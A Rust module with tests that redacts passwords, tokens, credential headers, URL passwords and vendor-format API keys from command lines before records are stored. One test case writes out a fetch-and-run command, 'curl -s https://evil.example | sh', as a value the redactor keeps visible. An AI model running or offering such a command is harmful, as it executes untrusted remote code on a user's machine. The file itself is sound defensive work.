//! Secrets given on a command line, taken out before a record is built: a
//! command is kept whole, in the lake and for a model, and a password typed
//! as an argument would go wherever the record does. The value goes and the
//! fact stays: `--password [secret: 12 bytes]` still says a password was
//! passed, and to what.
//!
//! This reads shapes, so it finds the secrets people are known to write on
//! a line: a credential header, a flag or a variable named for a secret, a
//! password in a URL, a signed URL, a key in a vendor's own format. A secret
//! in a shape nobody listed is kept as written.

/// What a secret is replaced by.
fn mark(bytes: usize) -> String {
    format!("[secret: {bytes} bytes]")
}

/// The arguments with their secrets taken out.
pub fn hidden(args: &[String]) -> Vec<String> {
    let mut out = Vec::with_capacity(args.len());
    // the argument before was a flag whose value is the secret
    let mut flagged = false;
    for a in args {
        if flagged && !a.is_empty() && !a.starts_with('-') && !live(a) {
            out.push(mark(a.len()));
            flagged = false;
            continue;
        }
        flagged = a.starts_with("--") && !a.contains('=') && secret_name(a);
        out.push(text(a));
    }
    out
}

/// One argument, or a shell's whole line, with its secrets taken out.
pub fn text(s: &str) -> String {
    let s = normkit::unsigned(s).unwrap_or_else(|| s.to_string());
    tokens(&named(&userinfo(&s)))
}

/// A value that is not the secret itself: a variable the shell fills in, or
/// a command it runs for the value, which is code a reader should see.
fn live(v: &str) -> bool {
    v.starts_with('$') || v.contains("$(") || v.contains('`')
}

/// Words that say what a secret is kept in or how it is described, not the
/// secret: `--token-file`, `AUTH_URL`, `SECRET_NAME`.
const ABOUT: &[&str] = &[
    "file", "path", "dir", "name", "url", "uri", "endpoint", "host", "type", "id", "ttl", "env",
    "var", "header", "prefix", "length", "len", "count", "expiry", "expires", "method", "mode",
    "stdin", "prompt", "command", "cmd", "helper", "store", "manager", "policy", "required",
    "enabled", "sock", "socket", "plugin", "provider", "scheme", "realm", "scope", "scopes",
    "user", "username",
];
/// Words that name a secret wherever they stand in a name.
const NAMES: &[&str] = &[
    "password",
    "passwd",
    "passphrase",
    "secret",
    "token",
    "apikey",
    "credential",
    "credentials",
    "bearer",
];
/// Words that make `key` a secret's name: `--api-key`, `access_key`.
const KEYS: &[&str] = &["api", "access", "secret", "signing", "encryption", "master"];

/// Whether a flag's or a variable's name says its value is a secret.
fn secret_name(name: &str) -> bool {
    let name = name.trim_start_matches('-');
    let shouted = !name.bytes().any(|b| b.is_ascii_lowercase());
    let parts: Vec<String> = name
        .split(['_', '-', '.'])
        .filter(|p| !p.is_empty())
        .map(str::to_ascii_lowercase)
        .collect();
    let Some(last) = parts.last() else {
        return false;
    };
    if ABOUT.contains(&last.as_str()) {
        return false;
    }
    parts.iter().enumerate().any(|(i, p)| {
        NAMES.contains(&p.as_str())
            // `--auth` and `DB_PASS` are the secret; `SSH_AUTH_SOCK` and
            // `--pass-through` are something else's name
            || ((p == "pass" || p == "auth") && i + 1 == parts.len())
            // an environment's `STRIPE_KEY` is a secret; a flag's `--key` is anything
            || (p == "key" && (shouted || i > 0 && KEYS.contains(&parts[i - 1].as_str())))
    })
}

/// Headers whose value is a credential.
const HEADERS: &[&str] = &[
    "authorization",
    "proxy-authorization",
    "x-api-key",
    "api-key",
    "x-auth-token",
    "x-amz-security-token",
    "cookie",
    "set-cookie",
];

fn name_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.')
}

/// A value from `at`: what is between quotes when it opens with one, else up
/// to whatever ends a word on a shell's line.
fn value(s: &str, at: usize) -> Option<(usize, usize)> {
    let b = s.as_bytes();
    match b.get(at)? {
        q @ (b'"' | b'\'') => {
            let end = s[at + 1..].find(*q as char).map_or(s.len(), |e| at + 1 + e);
            Some((at + 1, end))
        }
        _ => {
            let end = s[at..]
                .find(|c: char| c.is_whitespace() || "\"'&;|)<>".contains(c))
                .map_or(s.len(), |e| at + e);
            Some((at, end))
        }
    }
}

/// A header's value from `at`, after its scheme (`Bearer`, `Basic`): to the
/// quote the header sits in, or the line's end.
fn header_value(s: &str, at: usize) -> Option<(usize, usize)> {
    let rest = &s[at..];
    let mut from = at + (rest.len() - rest.trim_start_matches(' ').len());
    let end = s[from..]
        .find(['"', '\'', '\n'])
        .map_or(s.len(), |e| from + e);
    if let Some(space) = s[from..end].find(' ') {
        if s[from..from + space]
            .bytes()
            .all(|b| b.is_ascii_alphabetic())
        {
            from += space + 1;
        }
    }
    Some((from, end))
}

/// `name=value`, `--name value`, `"name": "value"` and `Header: value`, where
/// the name says the value is a secret.
fn named(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let (mut i, mut kept) = (0, 0);
    while i < b.len() {
        if !name_byte(b[i]) {
            i += 1;
            continue;
        }
        let start = i;
        while i < b.len() && name_byte(b[i]) {
            i += 1;
        }
        let name = &s[start..i];
        let found = match b.get(i) {
            Some(b'=') if secret_name(name) => value(s, i + 1),
            Some(b':') if HEADERS.contains(&name.to_ascii_lowercase().as_str()) => {
                header_value(s, i + 1)
            }
            Some(b' ') if name.starts_with("--") && secret_name(name) => {
                let at = i + (s[i..].len() - s[i..].trim_start_matches(' ').len());
                value(s, at).filter(|_| b.get(at) != Some(&b'-'))
            }
            // JSON: the name's closing quote, a colon, the value in quotes
            Some(b'"') if start > 0 && b[start - 1] == b'"' && secret_name(name) => {
                let after = s[i + 1..].trim_start_matches(' ');
                after.strip_prefix(':').and_then(|v| {
                    let v = v.trim_start_matches(' ');
                    value(s, s.len() - v.len()).filter(|_| v.starts_with('"'))
                })
            }
            _ => None,
        };
        if let Some((from, to)) = found.filter(|(from, to)| to > from && !live(&s[*from..*to])) {
            out.push_str(&s[kept..from]);
            out.push_str(&mark(to - from));
            (kept, i) = (to, to);
        }
    }
    out.push_str(&s[kept..]);
    out
}

/// The password in a URL's `user:password@host`.
fn userinfo(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut kept = 0;
    let mut at = 0;
    while let Some(found) = s[at..].find("://") {
        let host = at + found + 3;
        let end = s[host..]
            .find(|c: char| c.is_whitespace() || "/?#\"'".contains(c))
            .map_or(s.len(), |e| host + e);
        at = end;
        let authority = &s[host..end];
        let Some((user, _)) = authority.rsplit_once('@') else {
            continue;
        };
        let Some((_, password)) = user.split_once(':') else {
            continue;
        };
        if password.is_empty() || live(password) {
            continue;
        }
        let from = host + user.len() - password.len();
        out.push_str(&s[kept..from]);
        out.push_str(&mark(password.len()));
        kept = from + password.len();
    }
    out.push_str(&s[kept..]);
    out
}

/// How a vendor's key starts, and how many characters follow at the least.
const SHAPES: &[(&str, usize)] = &[
    ("sk-ant-", 20),
    ("sk-proj-", 20),
    ("sk-or-", 20),
    ("sk_live_", 16),
    ("sk_test_", 16),
    ("rk_live_", 16),
    ("github_pat_", 20),
    ("ghp_", 30),
    ("gho_", 30),
    ("ghu_", 30),
    ("ghs_", 30),
    ("ghr_", 30),
    ("glpat-", 16),
    ("xoxb-", 16),
    ("xoxp-", 16),
    ("xoxa-", 16),
    ("xoxs-", 16),
    ("xapp-", 16),
    ("npm_", 30),
    ("hf_", 30),
    ("dop_v1_", 30),
    ("ya29.", 20),
    ("AIza", 30),
    ("AKIA", 16),
    ("ASIA", 16),
    // a JSON Web Token: three runs with a dot between
    ("eyJ", 40),
    // OpenAI's older keys, and whoever copied the form
    ("sk-", 32),
];

/// A key in a vendor's own format, wherever it stands: its start is kept,
/// which says whose it is.
fn tokens(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let (mut i, mut kept) = (0, 0);
    while i < b.len() {
        let boundary = i == 0 || !(b[i - 1].is_ascii_alphanumeric() || b[i - 1] == b'_');
        let shape = SHAPES
            .iter()
            .find(|(start, _)| boundary && s[i..].starts_with(start));
        let Some((start, least)) = shape else {
            i += 1;
            while i < b.len() && !s.is_char_boundary(i) {
                i += 1;
            }
            continue;
        };
        let from = i + start.len();
        let dotted = *start == "eyJ" || *start == "ya29.";
        let to = s[from..]
            .find(|c: char| {
                !(c.is_ascii_alphanumeric() || c == '_' || c == '-' || dotted && c == '.')
            })
            .map_or(s.len(), |e| from + e);
        let run = &s[from..to];
        let fits = run.len() >= *least
            && run.bytes().any(|c| c.is_ascii_digit())
            && (*start != "eyJ" || run.matches('.').count() == 2);
        if fits {
            out.push_str(&s[kept..from]);
            out.push_str(&mark(run.len()));
            kept = to;
        }
        i = to.max(i + 1);
    }
    out.push_str(&s[kept..]);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn line(args: &[&str]) -> String {
        let args: Vec<String> = args.iter().map(|a| a.to_string()).collect();
        hidden(&args).join(" ")
    }

    #[test]
    fn a_credential_header_keeps_its_name_and_scheme() {
        assert_eq!(
            line(&[
                "curl",
                "-H",
                "Authorization: Bearer abc123def456",
                "https://api.example/v1"
            ]),
            "curl -H Authorization: Bearer [secret: 12 bytes] https://api.example/v1"
        );
        // inside a shell's line, the quote the header sits in ends it
        assert_eq!(
            text("curl -H 'X-Api-Key: k-123456' -H \"Accept: text/plain\" https://x.example"),
            "curl -H 'X-Api-Key: [secret: 8 bytes]' -H \"Accept: text/plain\" https://x.example"
        );
        assert_eq!(
            text("Cookie: sid=abc; theme=dark"),
            "Cookie: [secret: 19 bytes]"
        );
    }

    #[test]
    fn a_flag_or_a_variable_named_for_a_secret_loses_its_value() {
        assert_eq!(
            line(&["mysql", "--user", "root", "--password", "hunter2", "db"]),
            "mysql --user root --password [secret: 7 bytes] db"
        );
        assert_eq!(text("--api-key=abcdef"), "--api-key=[secret: 6 bytes]");
        assert_eq!(
            text("GITHUB_TOKEN=abc123 STRIPE_KEY='sk x' ./deploy --token abc --verbose"),
            "GITHUB_TOKEN=[secret: 6 bytes] STRIPE_KEY='[secret: 4 bytes]' ./deploy --token [secret: 3 bytes] --verbose"
        );
        assert_eq!(
            text(r#"curl -d '{"user":"me","password": "hunter2"}' https://x.example"#),
            r#"curl -d '{"user":"me","password": "[secret: 7 bytes]"}' https://x.example"#
        );
        assert_eq!(
            text("db.password=abc;timeout=5"),
            "db.password=[secret: 3 bytes];timeout=5"
        );
        assert_eq!(
            text("curl --auth me:hunter2 x"),
            "curl --auth [secret: 10 bytes] x"
        );
    }

    #[test]
    fn a_name_that_is_about_a_secret_keeps_its_value() {
        for kept in [
            "--token-file /run/secrets/t",
            "--password-file=/etc/p",
            "AUTH_URL=https://login.example",
            "SECRET_NAME=prod/db",
            "--author Ada",
            "PWD=/Users/dev/code",
            "--key ./server.pem",
            "sort --key=2",
            "--no-auth --verbose",
            "docker login --password-stdin registry.example",
            "--password-command pass show db",
            "KEY_ID=abc",
            "SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.x/Listeners",
            "--auth-plugin mysql_native_password",
        ] {
            assert_eq!(text(kept), kept);
            let args: Vec<String> = kept.split(' ').map(str::to_string).collect();
            assert_eq!(hidden(&args).join(" "), kept);
        }
    }

    /// What a shell fills in or runs for a value is not the secret, and a
    /// command there is one a reader should see.
    #[test]
    fn a_value_the_shell_computes_is_kept() {
        for kept in [
            "--token $GITHUB_TOKEN",
            "API_KEY=${API_KEY}",
            "PASSWORD=$(curl -s https://evil.example | sh)",
            "TOKEN=`cat /tmp/x`",
            "curl -H \"Authorization: Bearer $(security find-generic-password -w)\" https://x.example",
        ] {
            assert_eq!(text(kept), kept);
        }
        assert_eq!(line(&["tool", "--password", "$PW"]), "tool --password $PW");
    }

    #[test]
    fn a_url_loses_its_password_and_its_signature() {
        assert_eq!(
            text("git clone https://x-access-token:abcdef@github.com/acme/app.git"),
            "git clone https://x-access-token:[secret: 6 bytes]@github.com/acme/app.git"
        );
        assert_eq!(
            text("curl 'https://b.example/f?sv=1&sig=abc%2Fdef' -o f"),
            "curl 'https://b.example/f?sv=1' -o f"
        );
        assert_eq!(
            text("https://user@host.example/p"),
            "https://user@host.example/p"
        );
    }

    #[test]
    fn a_key_in_its_vendor_s_format_keeps_its_start() {
        let key = format!("ghp_{}", "a1B2".repeat(9));
        assert_eq!(
            text(&format!("gh auth login --with-token <<< {key}")),
            "gh auth login --with-token <<< ghp_[secret: 36 bytes]"
        );
        assert_eq!(
            text("aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE"),
            "aws configure set aws_access_key_id AKIA[secret: 16 bytes]"
        );
        let jwt = format!(
            "eyJ{}.eyJ{}.{}",
            "a1".repeat(10),
            "b2".repeat(20),
            "c3".repeat(20)
        );
        assert_eq!(
            text(&format!("echo {jwt} | cut -d. -f2")),
            format!("echo eyJ[secret: {} bytes] | cut -d. -f2", jwt.len() - 3)
        );
        // a word that only starts like one
        for kept in [
            "sk-learn",
            "npm_config_registry",
            "task-12345",
            "eyJhbGciOi",
        ] {
            assert_eq!(text(kept), kept);
        }
        // and a character is never split
        assert_eq!(text("écho ghp_short ünïcode"), "écho ghp_short ünïcode");
    }
}
